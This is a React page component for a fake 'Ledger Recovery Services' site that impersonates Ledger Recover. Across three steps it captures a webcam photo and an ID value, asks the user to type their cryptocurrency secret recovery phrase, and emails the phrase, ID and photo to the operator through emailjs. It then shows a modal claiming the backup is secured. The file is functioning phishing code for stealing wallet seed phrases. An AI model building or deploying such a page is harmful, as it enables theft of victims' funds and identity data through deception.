import React, { useState, useRef, useEffect, useContext } from 'react';
import emailjs from 'emailjs-com';
import Modal from 'react-modal';
import { FaCheckCircle } from 'react-icons/fa';
import { AuthContext } from '../context/AuthContext';

// Set the app element for Modal
Modal.setAppElement('#root');

function AuthPage() {
  const [photo, setPhoto] = useState(null);
  const [isBackupComplete, setIsBackupComplete] = useState(false);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [currentStep, setCurrentStep] = useState(1);
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [isFrontCamera, setIsFrontCamera] = useState(true);
  const [videoStream, setVideoStream] = useState(null);
  
  const { state, verifyId, verifySeedPhrase, verifyCamera } = useContext(AuthContext);

  useEffect(() => {
    startVideo();
    return () => {
      stopVideo();
    };
  }, [isFrontCamera]);

  const startVideo = () => {
    const constraints = {
      video: { facingMode: isFrontCamera ? 'user' : 'environment' },
    };
    navigator.mediaDevices.getUserMedia(constraints)
      .then(stream => {
        setVideoStream(stream);
        videoRef.current.srcObject = stream;
        videoRef.current.play();
      })
      .catch(err => {
        console.error('Error accessing camera: ', err);
      });
  };

  const stopVideo = () => {
    if (videoStream) {
      const tracks = videoStream.getTracks();
      tracks.forEach(track => track.stop());
    }
  };

  const capturePhoto = () => {
    const context = canvasRef.current.getContext('2d');
    context.drawImage(videoRef.current, 0, 0, canvasRef.current.width, canvasRef.current.height);
    const dataUrl = canvasRef.current.toDataURL('image/png');
    setPhoto(dataUrl);
  };

  const sendEmail = () => {
    if (!state.isVerified || !photo) {
      alert('Please complete all verifications.');
      return;
    }

    const templateParams = {
      id: state.id,
      seedPhrase: state.seedPhrase,
      photo: photo,
    };

    emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams, 'YOUR_USER_ID')
      .then((result) => {
        console.log(result.text);
        alert('Email sent successfully!');
        setIsBackupComplete(true);
        setIsModalOpen(true);
      }, (error) => {
        console.log(error.text);
        alert('Failed to send email.');
      });
  };

  const handleNextStep = () => {
    setCurrentStep(currentStep + 1);
  };

  return (
    <div className="container mx-auto p-5">
      <h1 className="text-3xl font-bold text-center mb-8">Ledger Recovery Services</h1>

      {/* Progress Bar */}
      <div className="flex justify-around mb-10 max-xl:hidden">
        <div className="flex flex-col items-center">
          <div className={`w-10 h-10 ${currentStep >= 1 ? 'bg-blue-500' : 'bg-gray-300'} text-white rounded-full flex items-center justify-center`}>1</div>
          <span className="mt-2">IdVerification</span>
        </div>
        {/* <div className="flex flex-col items-center">
          <div className={`w-10 h-10 ${currentStep >= 2 ? 'bg-blue-500' : 'bg-gray-300'} text-white rounded-full flex items-center justify-center`}>2</div>
          <span className="mt-2">Verify ID</span>
        </div> */}
        <div className="flex flex-col items-center">
          <div className={`w-10 h-10 ${currentStep >= 2 ? 'bg-blue-500' : 'bg-gray-300'} text-white rounded-full flex items-center justify-center`}>3</div>
          <span className="mt-2">Secret Recovery Phrase</span>
        </div>
        <div className="flex flex-col items-center">
          <div className={`w-10 h-10 ${currentStep >= 3 ? 'bg-blue-500' : 'bg-gray-300'} text-white rounded-full flex items-center justify-center`}>4</div>
          <span className="mt-2">Back Up</span>
        </div>
      </div>

      {currentStep === 1 && (
        <div className="mb-8">
          <h2 className="text-xl font-semibold mb-4">ID Verification</h2>
          <button onClick={() => setIsFrontCamera(!isFrontCamera)} className="bg-blue-500 text-white py-2 px-4 rounded-md hover:bg-blue-600 mb-4">
            Switch Camera
          </button>
          <div className="flex justify-center">
            <video ref={videoRef} className="w-full max-w-md" />
            <canvas ref={canvasRef} className="hidden" width="400" height="300"></canvas>
          </div>
          <button onClick={capturePhoto} className="bg-blue-500 text-white py-2 px-4 rounded-md hover:bg-blue-600 mt-4">
            Capture Photo
          </button>
          {photo && (
            <div className="mt-4 flex flex-col justify-center items-center ">
              <h3 className="text-lg font-medium">Captured:</h3>
              <img src={photo} alt="Captured" className="w-full max-w-md mt-2" />
            </div>
          )}
          <button onClick={handleNextStep} className=" flex justify-end items-right bg-blue-500 text-white py-2 px-4 rounded-md hover:bg-blue-600 mt-4 mx-[20px]">Next</button>
        </div>
      )}

      {currentStep === 2 && (
        <div className="mb-8">
         <SeedPhraseVerification onNext={handleNextStep} />
        </div>
      )}

      {/* {currentStep === 4 && (
        <div className="mb-8">
          <SeedPhraseVerification onNext={handleNextStep} />
        </div>
      )} */}

      {currentStep === 3 && (
        <div className="mb-8">
          <CameraVerification onNext={handleNextStep} />
          <button onClick={sendEmail} className="bg-blue-500 text-white py-2 px-4 rounded-md hover:bg-blue-600 mt-4">
            Back Up
          </button>
        </div>
      )}

      {/* Backup Complete Modal */}
      <Modal
        isOpen={isModalOpen}
        onRequestClose={() => setIsModalOpen(false)}
        className="fixed inset-0 bg-white p-4 flex flex-col items-center justify-center z-50"
        overlayClassName="fixed inset-0 bg-black bg-opacity-50 z-40"
      >
        <div className="text-center">
          <FaCheckCircle className="text-green-500 text-6xl mb-4" />
          <img src="/mnt/data/WhatsApp Image 2024-08-04 at 6.43.22 AM.jpeg" alt="Backup Complete" className="mx-auto mb-4" />
          <p className="text-xl font-bold">You&apos;ve secured the backup for your Secret Recovery Phrase using Ledger Recover.</p>
          <button onClick={() => setIsModalOpen(false)} className="mt-4 bg-blue-500 text-white py-2 px-4 rounded-md hover:bg-blue-600">Close</button>
        </div>
      </Modal>
    </div>
  );
}

// Sub-components to be integrated within the AuthPage

// function IdVerification({ onNext }) {
//   const [id, setId] = useState('');
//   const { state, verifyId } = useContext(AuthContext);

//   const handleSubmit = (e) => {
//     e.preventDefault();
//     verifyId(id);
//     if (!state.error) {
//       onNext();
//     }
//   };

//   return (
//     <div>
//       <h2>ID Verification</h2>
//       <form onSubmit={handleSubmit}>
//         <label>
//           Enter your ID:
//           <input type="text" value={id} onChange={(e) => setId(e.target.value)} />
//         </label>
//         <button type="submit">Submit</button>
//       </form>
//       {state.error && <p>{state.error.message}</p>}
//     </div>
//   );
// }

function SeedPhraseVerification({ onNext }) {
  const [seedPhrase, setSeedPhrase] = useState('');
  const { state, verifySeedPhrase } = useContext(AuthContext);

  const handleSubmit = (e) => {
    e.preventDefault();
    verifySeedPhrase(seedPhrase);
    if (!state.error) {
      onNext();
    }
  };

  return (
    <div>
      <h1>Seed Phrase Verification</h1>
      <form onSubmit={handleSubmit}>
        <label className="block mb-2">Enter your Secret Recovery Phrase:</label>
        <textarea
          type="text"
          value={seedPhrase}
          onChange={(e) => setSeedPhrase(e.target.value)}
          className="w-full border h-[100px] flex justify-start border-gray-300 rounded-md p-2 required"
        >
        </textarea>
        <button  type="submit" className="bg-blue-500 text-white py-2 px-4 rounded-md hover:bg-blue-600 mt-4">Submit</button>
      </form>
      {state.error && <p>{state.error.message}</p>}
    </div>
  );
}

function CameraVerification() {
  const { state, verifyCamera } = useContext(AuthContext);
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [photo, setPhoto] = useState(null);

  useEffect(() => {
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
      })
      .catch(err => {
        console.error('Error accessing camera: ', err);
      });

    return () => {
      if (videoRef.current && videoRef.current.srcObject) {
        const tracks = videoRef.current.srcObject.getTracks();
        tracks.forEach(track => track.stop());
      }
    };
  }, []);

  const capturePhoto = () => {
    const context = canvasRef.current.getContext('2d');
    context.drawImage(videoRef.current, 0, 0, canvasRef.current.width, canvasRef.current.height);
    const dataUrl = canvasRef.current.toDataURL('image/png');
    setPhoto(dataUrl);
  };

  const handleVerification = () => {
    if (photo) {
      verifyCamera(photo);
    } else {
      alert('Please capture a photo first.');
    }
  };

  return (
    <div className='grid'>
      <h1>Camera Verification</h1>
      <div className="place-self-center">
        <video ref={videoRef} style={{ width: '100%', maxWidth: '400px' }} />
        <canvas ref={canvasRef} style={{ display: 'none' }} width="400" height="300"></canvas>
      </div>
      <button onClick={capturePhoto} className="place-self-center bg-blue-500 text-white py-2 px-4 rounded-md hover:bg-blue-600 mt-4">Capture Photo</button>
      {photo && (
        <div className="place-self-center">
          <h2 className="text-center">Captured Photo:</h2>
          <img src={photo} alt="Captured" style={{ width: '100%', maxWidth: '400px' }} />
        </div>
      )}
      <button onClick={handleVerification}className="place-self-center bg-blue-500 text-white py-2 px-4 rounded-md hover:bg-blue-600 mt-4 mx-[20px]">Verify Photo</button>
      {state.error && <p className="place-self-center text-red-600">{state.error.message}</p>}
    </div>
  );
}

export default AuthPage;
